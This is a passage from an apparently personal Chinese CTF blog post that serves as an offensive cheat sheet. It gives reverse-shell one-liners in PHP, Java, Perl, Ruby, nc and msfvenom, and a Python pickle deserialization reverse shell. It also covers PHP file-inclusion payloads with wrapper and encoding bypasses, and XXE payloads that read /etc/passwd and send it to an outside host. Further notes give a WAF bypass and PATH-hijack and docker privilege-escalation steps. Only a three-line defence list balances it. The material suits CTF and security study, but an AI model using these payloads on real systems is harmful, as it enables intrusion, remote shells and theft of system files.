<p>php -r ‘$sock=fsockopen(“ip”,port);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
</blockquote>
<h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><blockquote>
<p>r = Runtime.getRuntime()<br>p = r.exec([“/bin/bash”,”-c”,”exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&5; done”] as String[])<br>p.waitFor()</p>
</blockquote>
<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><blockquote>
<p>perl -e ‘use Socket;$i=”ip”;$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p>
</blockquote>
<h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h3><blockquote>
<p>ruby -rsocket -e’f=TCPSocket.open(“ip”,port).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”,f,f,f)’</p>
</blockquote>
<h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><blockquote>
<p>nc -e /bin/sh ip port</p>
</blockquote>
<h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p>查询信息</p>
<blockquote>
<p>msfvenom -l payloads ‘cmd/unix/reverse’</p>
</blockquote>
<p>选择payload</p>
<blockquote>
<p>msfvenom -p cmd/unix/reverse_bash lhost=1.1.1.1 lport=12345 R</p>
</blockquote>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>利用条件：与文件包含的函数有四个</p>
<ul>
<li>include()</li>
<li>include_once()</li>
<li>require()</li>
<li>require_once()</li>
</ul>
<p>当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析</p>
<h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p>本地文件包含漏洞</p>
<h3 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h3><p>远程文件包含漏洞，利用环境比较严格，需要在php.ini中设置</p>
<ul>
<li>allow_url_fopen = On</li>
<li>allow_url_include = On</li>
</ul>
<h3 id="常见敏感文件"><a href="#常见敏感文件" class="headerlink" title="常见敏感文件"></a>常见敏感文件</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><ul>
<li>c:\boot.ini</li>
<li>c:\windows\systems32\inetsrv\MetaBase.xml</li>
<li>c:\windows\repair\sam</li>
<li>c:\windows\php.ini             php配置文件</li>
<li>c:\windows\my.ini               mysql配置文件</li>
</ul>
<h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><h5 id="java-1"><a href="#java-1" class="headerlink" title="java"></a>java</h5><ul>
<li>WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.</li>
<li>WEB-INF/database.properties : 数据库配置文件</li>
<li>WEB-INF/classes/ : 一般用来存放Java类文件(.class)</li>
<li>WEB-INF/lib/ : 用来存放打包好的库(.jar)</li>
<li>WEB-INF/src/ : 用来放源代码(.asp和.php等)</li>
<li>tomcat[默认端口8080 需要用户名密码,还是那句话多尝试些弱口令,进去以后上传war马]</li>
<li>jboss [默认端口8080无需任何验证,进去以后上传war马]</li>
<li>weblogic [默认端口7001,实际很多是在8080上,进去以后上传war马]</li>
<li>Websphere[默认端口9043,实际很多是在8080上,进去以后上传war马]</li>
<li>webmin[web版的服务器管理工具,默认端口10000,可以把它当做图形版的ssh管理工具]</li>
</ul>
<h4 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h4><ul>
<li>/etc/passwd</li>
<li>/usr/local/app/apache2/conf/http.conf</li>
<li>/usr/local/app/php5/lib/php.ini          PHP相关设置</li>
<li>/etc/httpd/conf/http.conf                    apache配置文件</li>
<li>/etc/my.cnf     </li>
<li>/etc/nginx/nginx.conf                            nginx配置文件</li>
<li>/var/www/html/wp-config.php           wordpress配置文件</li>
</ul>
<h3 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h3><h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>利用条件：</p>
<ul>
<li>allow_url_include = On。</li>
<li>对allow_url_fopen不做要求。</li>
</ul>
<blockquote>
<p>?file=php://input<br>POST:<br><? phpinfo();?></p>
</blockquote>
<h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><blockquote>
<p>?file=php://filter/read=convert.base64-encode/resource=index.php</p>
</blockquote>
<blockquote>
<p>?file=php://filter/convert.base64-encode/resource=index.php</p>
</blockquote>
<h5 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h5><p>利用条件：</p>
<ul>
<li>php版本大于等于php5.3.0</li>
</ul>
<p>假设有个文件phpinfo.txt，其内容为<code>&lt;?php phpinfo(); ?&gt;</code>，打包成zip压缩包，命名为test.zip</p>
<p>然后去包含</p>
<blockquote>
<p>?file=phar://test.zip/phpinfo.txt</p>
</blockquote>
<h5 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h5><p>利用条件：</p>
<ul>
<li>php版本大于等于php5.3.0</li>
</ul>
<p>利用同phar，但是需要指定绝对路径，同时将<code>#</code>编码为<code>%23</code></p>
<blockquote>
<p>?file=zip:///var/www/html/test.zip%23phpinfo.txt</p>
</blockquote>
<h5 id="data-URI-schema"><a href="#data-URI-schema" class="headerlink" title="data:URI schema"></a>data:URI schema</h5><p>利用条件：</p>
<ul>
<li>php版本大于等于php5.2</li>
<li>allow_url_fopen = On</li>
<li>allow_url_include = On</li>
</ul>
<blockquote>
<p>?file=data:text/plain,<?php phpinfo();?></p>
<p>?file=data:text/plain,<?php system('whoami');?></p>
<p>?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</p>
<p>?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==</p>
</blockquote>
<h4 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h4><p>利用条件：session文件路径已知，且其中内容部分可控。</p>
<p>常见的php-session存放位置：</p>
<ul>
<li>/var/lib/php/sess_PHPSESSID</li>
<li>/var/lib/php/sess_PHPSESSID</li>
<li>/tmp/sess_PHPSESSID</li>
<li>/tmp/sessions/sess_PHPSESSID</li>
</ul>
<h4 id="包含日志"><a href="#包含日志" class="headerlink" title="包含日志"></a>包含日志</h4><h5 id="服务器日志"><a href="#服务器日志" class="headerlink" title="服务器日志"></a>服务器日志</h5><p>利用条件： 需要知道服务器日志的存储路径，且日志文件可读</p>
<p>在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。默认情况下，日志保存路径在 /var/log/apache2/</p>
<h5 id="ssh日志"><a href="#ssh日志" class="headerlink" title="ssh日志"></a>ssh日志</h5><p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
<blockquote>
<p>$ ssh ‘<?php phpinfo(); ?>‘@remotehost</p>
</blockquote>
<p>然后进行文件包含即可</p>
<h4 id="包含environ"><a href="#包含environ" class="headerlink" title="包含environ"></a>包含environ</h4><p>利用条件：</p>
<ul>
<li>php以cgi方式运行，这样environ才会保持UA头。</li>
<li>environ文件存储位置已知，且environ文件可读。</li>
</ul>
<p>利用姿势：proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
<h4 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h4><p>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</p>
<h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><h4 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h4><p>服务器端常常会对于<code>../</code>等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。</p>
<ul>
<li>利用url编码<ul>
<li>../<ul>
<li>%2e%2e%2f</li>
<li>..%2f</li>
<li>%2e%2e/</li>
</ul>
</li>
<li>..\<ul>
<li>%2e%2e%5c</li>
<li>..%5c</li>
<li>%2e%2e\</li>
</ul>
</li>
</ul>
</li>
<li>二次编码<ul>
<li>../<ul>
<li>%252e%252e%252f</li>
</ul>
</li>
<li>..\<ul>
<li>%252e%252e%255c</li>
</ul>
</li>
</ul>
</li>
<li>容器/服务器的编码方式<ul>
<li>../<ul>
<li>..%c0%af<ul>
<li>注：<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work" target="_blank" rel="noopener">Why does Directory traversal attack %C0%AF work?</a></li>
</ul>
</li>
<li>%c0%ae%c0%ae/<ul>
<li>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）</li>
<li>Apache Tomcat Directory Traversal</li>
</ul>
</li>
</ul>
</li>
<li>..\<ul>
<li>..%c1%9c</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h4><p>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。</p>
<h5 id="姿势一：query-？"><a href="#姿势一：query-？" class="headerlink" title="姿势一：query ？"></a>姿势一：query ？</h5><blockquote>
<p>?file=<a href="http://remoteaddr/remoteinfo.txt" target="_blank" rel="noopener">http://remoteaddr/remoteinfo.txt</a>?</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># remoteinfo.txt</span></span><br><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="姿势二：fragment"><a href="#姿势二：fragment" class="headerlink" title="姿势二：fragment"></a>姿势二：fragment</h5><blockquote>
<p>?file=<a href="http://remoteaddr/remoteinfo.txt%23" target="_blank" rel="noopener">http://remoteaddr/remoteinfo.txt%23</a></p>
</blockquote>
<h5 id="姿势三：长度截断"><a href="#姿势三：长度截断" class="headerlink" title="姿势三：长度截断"></a>姿势三：长度截断</h5><p>利用条件： php版本 &lt; php 5.2.8</p>
<p>目录字符串，在linux下4096字节时会达到最大值，在window下是256字节。只要不断的重复<code>./</code>则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p>
<h5 id="姿势四：0字节截断"><a href="#姿势四：0字节截断" class="headerlink" title="姿势四：0字节截断"></a>姿势四：0字节截断</h5><p>利用条件： php版本 &lt; php 5.3.4</p>
<blockquote>
<p>?file=phpinfo.txt%00</p>
</blockquote>
<h4 id="strops-绕过"><a href="#strops-绕过" class="headerlink" title="strops 绕过"></a>strops 绕过</h4><blockquote>
<p>?file=php://filter/string.strip_tags/resource=/etc/passwd</p>
</blockquote>
<p>将<code>php://filter/string.strip_tags/resource=/etc/passwd</code>这个 payload 传入<code>include</code>方法会让 php 产生一个 segmentfault ，然后在这段时间内上传的文件将会存储在 php.ini 指定的 <code>upload_tmp_dir</code> 文件夹下，并且不会被删除</p>
<h3 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h3><ol>
<li>在很多场景中都需要去包含web目录之外的文件，如果php配置了open_basedir，则会包含失败</li>
<li>做好文件的权限管理</li>
<li>对危险字符进行过滤等等</li>
</ol>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="有回显，直接读文件"><a href="#有回显，直接读文件" class="headerlink" title="有回显，直接读文件"></a>有回显，直接读文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<h3 id="无回显，引用服务器上的XML文件"><a href="#无回显，引用服务器上的XML文件" class="headerlink" title="无回显，引用服务器上的XML文件"></a>无回显，引用服务器上的XML文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://xxe.com/1.xml&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br></pre></td></tr></table></figure>

<p>1.xml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;!ENTITY % a SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY % b &quot;&lt;!ENTITY &amp;#37; c SYSTEM &apos;gopher://xxe.com/%a;&apos;&gt;&quot;&gt; %b; %c`</span><br></pre></td></tr></table></figure>

<p>然后访问log</p>
<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h3 id="伪造ip"><a href="#伪造ip" class="headerlink" title="伪造ip"></a>伪造ip</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For</span><br><span class="line">Client-IP</span><br><span class="line">x-remote-IP</span><br><span class="line">x-originating-IP</span><br><span class="line">x-remote-addr</span><br></pre></td></tr></table></figure>

<h3 id="三个MD5相同的不同文件"><a href="#三个MD5相同的不同文件" class="headerlink" title="三个MD5相同的不同文件"></a>三个MD5相同的不同文件</h3><blockquote>
<p>%41%6c%6c%20%45%69%6e%64%62%61%7a%65%6e%20%61%72%65%20%77%65%61%72%69%6e%67%20%77%6f%6f%64%65%6e%20%73%68%6f%65%73%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8a%51%c8%75%bf%58%a0%09%53%7b%69%4b%ce%01%f1%cc%7e%00%c0%fc%55%63%81%21%60%de%38%b1%d3%29%2a%f6%3a%aa%04%de%50%0d%34%33%8b%40%e8%39%1b%2c%e9%92%a7%e5%c5%2f%6f%5d%1c%f9%24%d0%4d%a3%00%55%3c%07%3b%ee%0a%d6%2b%2d%34%08%85%fe%9b%61%31%64%e4%2b%22%ad%34%6a%f7%85%26%e3%cb%1a%06%3c%ec%c7%dd%63%ce%8b%3e%94%02%98%03%91%a8%2e%74%cf%4f%38%76%ae%37%b2%5d%40%a8%36%9f%bc%7d%70%89%2d%dc%b6%95%66%da%eb%4d%53%d8%c8%37%2f%15%c8%77%2b%d6%3d%fc%46%42%c4%09%eb%4c%37%af%3b%17%d2%41%ce%6e%26%97%d6%bf%14%ae%c9%6c%4b%11%d0%6b%06%ca%da%f7%97%f3%69%8b%1f%5b%25%53%9f%2e%b1%bd%cd%fd%58%7f%e0%58%c6%e1%80%b3%02%88%85%ca%63%10%43%1a%24%1d%b8%82%eb%9c%16%52%38%84%d0%b6%3d%1a%ed%ef%45%d0%5a%4d%2f%95%6f%7f%60%32%ce%66%c6%b6%2d%11%32%a3%ec%b6%9d%e4%9c%53%93%8d%ba%a3%dc%5c%98%92%f4%82%07%1b%6f%3f%f5%e0%c5%79%de%b3%9a%00%0b%aa%34%7d%c3%fd%ac%5c%11%c3%2a%06%c7%15%cb%23%9e%7a%62%b1%c4%19%f4%70%ab%be%de%5c%ec%2b%2c%eb%03%41%fb%ed%37%67%73%24%d8%51%d9%67%a9%fc%bd%b5%c7%66%4b%b9%a2%d9%98%be%24%60%98%6b%f1%9b%96%af%7c%b4%55%d6%69%67%94%9f%c5%0d%f8%50%9d%12%11%4b%b5%00%e0%16%60%68%c8%d7%1d%32%28%97%49%c1%fd%39%43%0c%9c%29%48%e5%59%96%74%8e%10%06%2e%06%ee%4c%67%5e%26%98%35%84%66</p>
</blockquote>
<blockquote>
<p>%41%6c%6c%20%45%69%6e%64%62%61%7a%65%6e%20%61%72%65%20%77%65%61%72%69%6e%67%20%77%6f%6f%64%65%6e%20%73%68%6f%65%73%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8a%51%c8%75%bf%58%a0%09%53%7b%69%4b%ce%01%f1%cc%7e%00%c0%fc%55%63%81%21%60%de%38%b1%d3%29%2a%f6%3a%aa%04%de%50%0d%34%33%8b%40%e8%39%1b%2c%e9%92%a7%e5%c5%2f%6f%5d%1c%f9%24%d0%4d%a3%00%55%3c%07%3b%ee%0a%d6%2b%2d%34%08%85%fe%9b%61%31%64%e4%2b%22%ad%34%6a%f7%85%26%e3%cb%1a%06%3c%ec%c7%dd%63%ce%8b%3e%94%02%98%03%91%a8%2e%74%cf%4f%38%76%ae%37%b2%5d%40%a8%36%9f%bc%7d%70%89%2d%dc%b6%95%66%da%eb%4d%53%d8%c8%37%2f%15%c8%77%2b%d6%3d%fc%46%42%c4%09%6b%4c%37%af%3b%17%d2%41%ce%6e%26%97%d6%bf%14%ae%c9%6c%4b%11%d0%6b%06%ca%da%f7%17%f4%69%8b%1f%5b%25%53%9f%2e%b1%bd%cd%fd%d8%7f%e0%58%c6%e1%80%b3%02%88%85%ca%63%10%43%1a%24%1d%b8%82%eb%9c%16%52%b8%84%d0%b6%3d%1a%ed%ef%45%d0%5a%4d%2f%95%6f%7f%60%32%ce%66%c6%b6%2d%11%32%a3%6c%b6%9d%e4%9c%53%93%8d%ba%a3%dc%5c%98%92%74%82%07%1b%6f%3f%f5%e0%c5%79%de%b3%9a%00%0b%aa%34%7d%c3%fd%ac%5c%11%c3%2a%06%c7%15%cb%23%9e%7a%62%b1%c4%19%f4%70%ab%be%de%5c%ec%2b%2c%eb%03%41%fb%ed%37%67%73%24%d8%51%d9%67%a9%fc%bd%b5%c7%66%4b%b9%a2%d9%98%be%24%60%98%6b%f1%9b%96%af%7c%b4%55%d6%69%67%94%9f%c5%0d%f8%50%9d%12%11%4b%b5%00%e0%16%60%68%c8%d7%1d%32%28%97%49%c1%fd%39%43%0c%9c%29%48%e5%59%96%74%8e%10%06%2e%06%ee%4c%67%5e%26%98%35%84%66</p>
</blockquote>
<blockquote>
<p>%41%6c%6c%20%45%69%6e%64%62%61%7a%65%6e%20%61%72%65%20%77%65%61%72%69%6e%67%20%77%6f%6f%64%65%6e%20%73%68%6f%65%73%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8a%51%c8%75%bf%58%a0%09%53%7b%69%4b%ce%01%f1%cc%7e%00%c0%fc%55%63%81%21%60%de%38%b1%d3%29%2a%f6%3a%aa%04%de%50%0d%34%33%8b%40%e8%39%1b%2c%e9%92%a7%e5%c5%2f%6f%5d%1c%f9%24%d0%4d%a3%00%55%3c%07%3b%ee%0a%d6%2b%2d%34%08%85%fe%9b%61%31%64%e4%2b%22%ad%34%6a%f7%85%26%e3%cb%1a%06%3c%ec%c7%dd%63%ce%8b%3e%94%02%98%03%91%a8%2e%74%cf%4f%38%76%ae%37%b2%5d%40%a8%36%9f%bc%7d%70%89%2d%dc%b6%95%66%da%eb%4d%53%d8%c8%37%2f%15%c8%77%2b%d6%3d%fc%46%42%c4%09%eb%4c%37%af%3b%17%d2%41%ce%6e%26%97%d6%bf%14%ae%c9%6c%4b%11%d0%6b%06%ca%da%f7%97%f3%69%8b%1f%5b%25%53%9f%2e%b1%bd%cd%fd%58%7f%e0%58%c6%e1%80%b3%02%88%85%ca%63%10%43%1a%24%1d%b8%82%eb%9c%16%52%38%84%d0%b6%3d%1a%ed%ef%45%d0%5a%4d%2f%95%6f%7f%60%32%ce%66%c6%b6%2d%11%32%a3%ec%b6%9d%e4%9c%53%93%8d%ba%a3%dc%5c%98%92%f4%82%07%1b%6f%3f%f5%e0%c5%79%de%b3%9a%00%0b%aa%34%7d%c3%fd%ac%5c%11%c3%aa%06%c7%15%cb%23%9e%7a%62%b1%c4%19%f4%70%ab%be%de%5c%ec%2b%2c%eb%03%41%fb%ed%b7%66%73%24%d8%51%d9%67%a9%fc%bd%b5%c7%66%cb%b9%a2%d9%98%be%24%60%98%6b%f1%9b%96%af%7c%b4%55%d6%69%67%94%9f%c5%0d%78%50%9d%12%11%4b%b5%00%e0%16%60%68%c8%d7%1d%32%28%97%49%c1%fd%39%43%0c%9c%29%c8%e5%59%96%74%8e%10%06%2e%06%ee%4c%67%5e%a6%98%35%84%66</p>
</blockquote>
<h2 id="靶机渗透"><a href="#靶机渗透" class="headerlink" title="靶机渗透"></a>靶机渗透</h2><ul>
<li>?lang=php://filter/convert.base64-encode/resource=index</li>
<li>ssh <a href="mailto:mamadou@192.168.43.199" target="_blank" rel="noopener">mamadou@192.168.43.199</a> -p 3333</li>
<li>从python命令提示符到交互式shell：import pty pty.spawn(“/bin/bash”)</li>
<li>查找属于某用户的所有文件：find / -user devops 2&gt;/dev/null</li>
<li>生成msfvenom的反弹shell payload：msfvenom -p cmd/unix/reverse_python lhost=192.168.43.242 lport=2333 R</li>
<li>查看该用户能用sudo执行的命令：sudo -l</li>
<li>本地用python开启HTTP服务：python -m SimpleHTTPServer 80</li>
<li>绕过ModSecurity WAF：nc$u -e /bin$u/bash$u 192.168.1.108 7777</li>
<li>PHP短标签执行命令：&lt;?=`ls`;</li>
<li>查找SUID的文件：find / -perm -4000 2&gt;/dev/null</li>
<li>将/root路径下的文件映射到docker的根目录下：docker run -it -v /:/root ubuntu /bin/bash</li>
</ul>
<p>环境变量带<code>.</code>提权，劫持whoami</p>
<blockquote>
<p>echo $PATH</p>
<p>echo “/bin/sh” &gt; /tmp/whoami</p>
<p>chmod 777 /tmp/whoami</p>
<p>expert PATH=/tmp:$PATH</p>
<p>./a.out</p>
</blockquote>
<p>打包文件：tar -zcvf /home/xahot.tar.gz /xahot</p>
<h2 id="php-1"><a href="#php-1" class="headerlink" title="php"></a>php</h2><p>可以命令执行的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,putenv,apache_setenv,mb_send_mail,assert,dl,set_time_limit,ignore_user_abort,symlink,link,map_open,imap_mail,ini_set,ini_alter</span><br></pre></td></tr></table></figure>

<h2 id="python-反序列化"><a href="#python-反序列化" class="headerlink" title="python 反序列化"></a>python 反序列化</h2><p>读文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> (eval,(<span class="string">"open('flag.txt','r').read()"</span>,))</span><br><span class="line"></span><br><span class="line">a=test()</span><br><span class="line">payload=pickle.dumps(a)</span><br><span class="line">print(urllib.quote(payload))</span><br></pre></td></tr></table></figure>

<p>反弹shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        a = <span class="string">"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx.xxx.xxx.xxx",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))    </span><br><span class="line">a=A()</span><br><span class="line">result = pickle.dumps(a)</span><br><span class="line">pickle.loads(result)</span><br></pre></td></tr></table></figure>

<p>通过PVM操作码构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span> <span class="comment"># Your code here</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"""ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S'%s'</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS''</span></span><br><span class="line"><span class="string">tR(tR."""</span> % base64.b64encode(marshal.dumps(foo.func_code))</span><br></pre></td></tr></table></figure>


      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/CTF/" rel="tag"># CTF</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/07/04/ichunqiu/" rel="next" title="ichunqiu writeup">
                <i class="fa fa-chevron-left"></i> ichunqiu writeup
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/07/22/2019-CyBRICS/" rel="prev" title="CyBRICS ctf web writeup">
                CyBRICS ctf web writeup <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/wlp.jpg" alt="Moyu">
            
              <p class="site-author-name" itemprop="name">Moyu</p>
              <p class="site-description motion-element" itemprop="description">hack for fun</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">17</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
